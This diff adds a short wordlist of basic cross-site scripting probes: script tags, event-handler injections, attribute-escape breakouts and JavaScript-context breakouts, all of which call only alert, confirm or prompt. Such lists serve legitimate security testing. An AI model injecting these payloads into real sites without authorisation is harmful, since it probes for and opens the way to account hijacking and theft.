@@ -1,0 +1,31 @@
+# Basic XSS Payloads
+# These are simple, commonly effective payloads
+
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>confirm(1)</script>
+<script>prompt(1)</script>
+
+# Event-based payloads
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+
+# Attribute escapes
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+" onmouseover=alert(1) "
+' onmouseover=alert(1) '
+
+# JavaScript context
+'-alert(1)-'
+"-alert(1)-"
+';alert(1)//
+";alert(1)//
+</script><script>alert(1)</script>
